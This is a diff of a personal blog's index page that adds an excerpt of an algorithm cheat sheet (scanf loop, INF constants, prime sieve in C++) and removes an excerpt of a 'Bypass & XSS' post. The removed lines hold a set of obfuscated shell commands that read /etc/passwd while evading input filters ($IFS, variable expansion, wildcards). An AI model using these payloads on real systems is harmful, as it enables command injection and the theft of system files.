@@ -191,6 +191,80 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/01/15/算法题cheat sheet/" > Alorithm Cheat Sheet|算法Cheat Sheet </a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-15  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><i class="fa fa-code blink-slow"></i><em>持续记录</em></p>
+<h1 id="Alorithm-Cheat-Sheet-算法Cheat-Sheet"><a href="#Alorithm-Cheat-Sheet-算法Cheat-Sheet" class="headerlink" title="Alorithm Cheat Sheet|算法Cheat Sheet"></a>Alorithm Cheat Sheet|算法Cheat Sheet</h1><h3 id="技巧-Tricks"><a href="#技巧-Tricks" class="headerlink" title="技巧|Tricks"></a>技巧|Tricks</h3><hr>
+<ul>
+<li><p><code>while(~scanf(&quot;%d&quot;, &amp;n))</code></p>
+<p><code>~</code>是按位取反 <code>scanf</code>的返回值是输入值的个数 如果没有输入值就是返回-1 -1按位取反结果是0,即没有输入的时候退出循环</p>
+</li>
+<li><p><code>INF</code>(最大值)设置</p>
+<p>INF设为0x7fffffff：32-bit int的最大值，但是注意越界操作，且不能满足“无穷大加一个有穷的数依然是无穷大”条件</p>
+<p>INF设为0x3f3f3f3f：多数情况下较为合理，它是很大的数，方便数组清零操作memset(a,0x3f,sizeof(a))，且满<em>足无穷大加无穷大还是无穷大</em>的条件</p>
+</li>
+</ul>
+<h3 id="素数表生成-Prime-number-table"><a href="#素数表生成-Prime-number-table" class="headerlink" title="素数表生成|Prime number table"></a>素数表生成|Prime number table</h3><hr>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createprime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m = <span class="built_in">sqrt</span>(n + <span class="number">0.5</span>);</span><br><span class="line">	<span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">	vis[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= m; i++)</span><br><span class="line">	    <span class="keyword">if</span> (!vis[i])</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i*i; j &lt;= n; j += i)</span><br><span class="line">		     vis[j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*生成1到n的素数表，里面的循环是把非素数置为1，素数为0,1特殊对待，直接赋值为1，变为非素数*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime_2</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (num == <span class="number">1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> tmp = <span class="built_in">sqrt</span>(num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= tmp; i++)</span><br><span class="line">		<span class="keyword">if</span> (num %i == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*素数判断，对1特殊对待*/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="快速幂-Binary-Exponentiation"><a href="#快速幂-Binary-Exponentiation" class="headerlink" title="快速幂|Binary Exponentiation"></a>快速幂|Binary Exponentiation</h3><hr>
+	
+
+	</div>
+  <a type="button" href="/2021/01/15/算法题cheat sheet/#more" class="btn btn-default more">Read More →</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><i class="fa fa-code blink-slow"></i><em>持续记录</em></p>
+<h1 id="Alorithm-Cheat-Sheet-算法Cheat-Sheet"><a href="#Alorithm-Cheat-Sheet-算法Cheat-Sheet" class="headerlink" title="Alorithm Cheat Sheet|算法Cheat Sheet"></a>Alorithm Cheat Sheet|算法Cheat Sheet</h1><h3 id="技巧-Tricks"><a href="#技巧-Tricks" class="headerlink" title="技巧|Tricks"></a>技巧|Tricks</h3><hr>
+<ul>
+<li><p><code>while(~scanf(&quot;%d&quot;, &amp;n))</code></p>
+<p><code>~</code>是按位取反 <code>scanf</code>的返回值是输入值的个数 如果没有输入值就是返回-1 -1按位取反结果是0,即没有输入的时候退出循环</p>
+</li>
+<li><p><code>INF</code>(最大值)设置</p>
+<p>INF设为0x7fffffff：32-bit int的最大值，但是注意越界操作，且不能满足“无穷大加一个有穷的数依然是无穷大”条件</p>
+<p>INF设为0x3f3f3f3f：多数情况下较为合理，它是很大的数，方便数组清零操作memset(a,0x3f,sizeof(a))，且满<em>足无穷大加无穷大还是无穷大</em>的条件</p>
+</li>
+</ul>
+<h3 id="素数表生成-Prime-number-table"><a href="#素数表生成-Prime-number-table" class="headerlink" title="素数表生成|Prime number table"></a>素数表生成|Prime number table</h3><hr>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createprime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m = <span class="built_in">sqrt</span>(n + <span class="number">0.5</span>);</span><br><span class="line">	<span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">	vis[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= m; i++)</span><br><span class="line">	    <span class="keyword">if</span> (!vis[i])</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i*i; j &lt;= n; j += i)</span><br><span class="line">		     vis[j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*生成1到n的素数表，里面的循环是把非素数置为1，素数为0,1特殊对待，直接赋值为1，变为非素数*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime_2</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (num == <span class="number">1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> tmp = <span class="built_in">sqrt</span>(num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= tmp; i++)</span><br><span class="line">		<span class="keyword">if</span> (num %i == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*素数判断，对1特殊对待*/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="快速幂-Binary-Exponentiation"><a href="#快速幂-Binary-Exponentiation" class="headerlink" title="快速幂|Binary Exponentiation"></a>快速幂|Binary Exponentiation</h3><hr>
+	
+	...
+	...
+	...
+	<center>
+	  <a type="button" href="/2021/01/15/算法题cheat sheet/#more" class="btn btn-more more">Read More →</a><center/>
+	</div>
+</div>
+
+		
+			
+
+
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/01/10/LeetCode刷题记录(Array)-II/" > LeetCode-Array-II </a>
 		</h3>
 		</div>
@@ -691,62 +765,6 @@
 </div>
 
 		
-			
-
-
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/10/29/Bypass the WALL/" > Bypass &amp; XSS </a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-10-29  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><i class="fa fa-code blink-slow"></i>hack my life</p>
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>/etc/passwd</strong> </p>
-<hr>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat /e<span class="variable">$&#123;the&#125;</span>tc/<span class="variable">$&#123;game&#125;</span>pas<span class="variable">$&#123;ftw&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$game]&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game&#125;</span>]&#125;swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game[$&#123;ftw&#125;</span>]&#125;]&#125;swd</span><br><span class="line">cat /e$()tc/passwd</span><br><span class="line">cat /et$*c/pas<span class="variable">$@swd</span></span><br><span class="line">cat<span class="variable">$the</span> /etc<span class="variable">$game</span>/passwd<span class="variable">$ftw</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt; expalin</span><br><span class="line"></span><br><span class="line">If No Slash</span><br><span class="line">cat $(<span class="built_in">pwd</span> | head -c 1)etc$(<span class="built_in">pwd</span> | head -c 1)passwd</span><br><span class="line">If No space </span><br><span class="line">cat<span class="variable">$IFS</span>/etc/passwd</span><br><span class="line">still detect your string ? try wildcard</span><br><span class="line">cat /e*c/**ssw*</span><br><span class="line"></span><br><span class="line">expalin</span><br></pre></td></tr></table></figure>
-
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>
-	
-
-	</div>
-  <a type="button" href="/2020/10/29/Bypass the WALL/#more" class="btn btn-default more">Read More →</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><i class="fa fa-code blink-slow"></i>hack my life</p>
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>/etc/passwd</strong> </p>
-<hr>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat /e<span class="variable">$&#123;the&#125;</span>tc/<span class="variable">$&#123;game&#125;</span>pas<span class="variable">$&#123;ftw&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$game]&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game&#125;</span>]&#125;swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game[$&#123;ftw&#125;</span>]&#125;]&#125;swd</span><br><span class="line">cat /e$()tc/passwd</span><br><span class="line">cat /et$*c/pas<span class="variable">$@swd</span></span><br><span class="line">cat<span class="variable">$the</span> /etc<span class="variable">$game</span>/passwd<span class="variable">$ftw</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt; expalin</span><br><span class="line"></span><br><span class="line">If No Slash</span><br><span class="line">cat $(<span class="built_in">pwd</span> | head -c 1)etc$(<span class="built_in">pwd</span> | head -c 1)passwd</span><br><span class="line">If No space </span><br><span class="line">cat<span class="variable">$IFS</span>/etc/passwd</span><br><span class="line">still detect your string ? try wildcard</span><br><span class="line">cat /e*c/**ssw*</span><br><span class="line"></span><br><span class="line">expalin</span><br></pre></td></tr></table></figure>
-
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>
-	
-	...
-	...
-	...
-	<center>
-	  <a type="button" href="/2020/10/29/Bypass the WALL/#more" class="btn btn-more more">Read More →</a><center/>
-	</div>
-</div>
-
-		
 
 		</div>
 
@@ -821,21 +839,21 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/LeetCode/">LeetCode<span>2</span></a></li>
-		
-			<li><a href="/tags/Docker/">Docker<span>1</span></a></li>
-		
 			<li><a href="/tags/转载/">转载<span>17</span></a></li>
-		
-			<li><a href="/tags/code-library/">code library<span>4</span></a></li>
-		
-			<li><a href="/tags/Jupyter/">Jupyter<span>1</span></a></li>
-		
-			<li><a href="/tags/Instant-Message/">Instant Message<span>1</span></a></li>
 		
 			<li><a href="/tags/爬虫/">爬虫<span>1</span></a></li>
 		
 			<li><a href="/tags/GitHub/">GitHub<span>1</span></a></li>
+		
+			<li><a href="/tags/LeetCode/">LeetCode<span>2</span></a></li>
+		
+			<li><a href="/tags/Docker/">Docker<span>1</span></a></li>
+		
+			<li><a href="/tags/Instant-Message/">Instant Message<span>1</span></a></li>
+		
+			<li><a href="/tags/code-library/">code library<span>4</span></a></li>
+		
+			<li><a href="/tags/Jupyter/">Jupyter<span>1</span></a></li>
 		
 			<li><a href="/tags/笔记-备忘录/">笔记|备忘录<span>26</span></a></li>
 		
@@ -851,6 +869,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/01/15/算法题cheat sheet/" ><i class="fa fa-file-o"></i>Alorithm Cheat Sheet|算法Chea...</a>
+      </li>
+    
+      <li>
         <a href="/2021/01/10/LeetCode刷题记录(Array)-II/" ><i class="fa fa-file-o"></i>LeetCode-Array-II</a>
       </li>
     
@@ -864,10 +886,6 @@
     
       <li>
         <a href="/2020/12/11/Python-Funny-Project/" ><i class="fa fa-file-o"></i>Python NICE projects</a>
-      </li>
-    
-      <li>
-        <a href="/2020/11/29/[转]2020.11.30-12.6安全知识总结/" ><i class="fa fa-file-o"></i>(转载)2020.11.30-12.6一周安全知识动态</a>
       </li>
     
   </ul>
